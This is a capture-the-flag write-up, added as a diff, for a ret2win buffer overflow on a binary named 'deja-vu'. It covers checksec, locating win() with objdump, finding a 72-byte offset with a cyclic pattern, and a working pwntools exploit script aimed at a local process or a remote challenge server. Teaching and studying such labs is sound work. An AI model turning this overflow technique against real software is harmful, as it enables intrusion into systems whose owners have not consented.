@@ -1,0 +1,103 @@
+#### Step 1: Get to Know Your Binary ####
+
+Before you start poking at the binary with your exploit hammer, you need to understand what you're dealing with.
+
+Check the File Type:
+    $ file deja-vu
+      tells you it’s an ELF 64-bit binary. That means it’s built for Linux on a 64-bit machine.
+
+Check the Security Settings:
+    $ checksec --file=deja-vu
+        No PIE: The code addresses are static. Our win() function is always at the same place (0x4011f6).
+        No Stack Canary: No secret cookie to detect buffer overflows.
+        NX Enabled: Code execution in the stack is prevented—but that’s okay since we’re not injecting shellcode, just reusing existing functions.
+        Partial RELRO: Some protections are in place, but nothing stops our attack vector here.
+
+This binary is wide open, with a tiny security system—easy enough for us to exploit!
+
+#### Step 2: Discovering the Function Addresses ####
+
+You need to find the address of the function that gives us the flag—the win() function.
+
+Using Tools:
+    $ objdump - d deja-vu > dump.txt
+        By dumping the binary in Ghidra or using objdump, you discover that win() is at 0x4011f6.
+        This is your magic number. With a non-PIE binary, this address never changes.
+
+Summary: win() is at 0x4011f6
+
+#### Step 3: Finding the Buffer Overflow Offset ####
+
+Before you can direct execution to your win() function, you have to figure out exactly how many bytes to write before you hit the return address. Here's where a cyclic pattern comes in handy.
+Generate a Pattern:
+    $ gdb ./deja-vu
+    > cyclic 200
+        copy/paste the pattern when then program asks for input
+        and then, after crashing, you use:
+
+    > cyclic -l 0x616161616161616a #this is the most recent traceback address
+        offset at 72. Think of it as needing to fill 72 tiny slots before the door to the flag room opens!
+
+Summary:  win() is at 0x4011f6
+          offset is 72
+          no PIE - so the addresses will be the same. Time to write the script
+
+#### Step 4: Writing the Exploit Script ####
+
+Now for the fun part: writing a Python script using pwntools to automate the attack. The script does the following:
+
+    Connects to the Target:
+    It can either connect to a local binary or a remote server.
+
+    Builds the Payload:
+    It creates a payload that’s 72 bytes of junk followed by the little-endian packed address of win() (0x4011f6).
+    In pwntools, the p64() function packs our 64-bit address into the correct format for us... bargain!
+
+    Sends the Payload:
+    The payload is sent over the connection to trigger the buffer overflow. Once the overflow occurs, the function returns into win() instead of the normal execution flow.
+
+    Drops You into Interactive Mode:
+    This lets you see the output (hopefully the flag) and interact with the service if needed.
+
+#### #### #### #### ####
+
+from pwn import *
+
+# Editable variables for easy tweaking
+
+target_ip   = "20.84.72.194"   # Remote server IP
+target_port = 5005            # Remote server port
+offset      = 72              # Number of bytes to reach the return address (from cyclic analysis)
+win_address = 0x4011f6        # Address of the win() function (from objdump)
+
+
+# Choose connection type: local testing or remote target. Uncomment the line you want to test and comment out the other:
+
+# io = process("./deja-vu") #local file
+# io = remote(target_ip, target_port) #remote connection
+
+
+# Build the payload: padding followed by win() address (packed in little-endian)
+payload = b"A" * offset + p64(win_address)
+
+# Send the payload to the binary
+io.sendline(payload)
+
+# Switch to interactive mode to see the flag and interact with the shell, if available
+io.interactive()
+
+#### Step 5: Running Your Exploit ####
+
+Local Testing:
+  Make sure you have a flag.txt file in the same directory as your binary (with some dummy text for testing). Run the script locally to ensure it triggers the win() function and displays the expected output.
+
+Remote Attack:
+  Once you’re happy with your local tests, run the script against the remote server:
+
+#### Tools and Keywords ####
+buffer overflow
+ret2win
+
+gdb
+pwntools
+ghidra (opt)
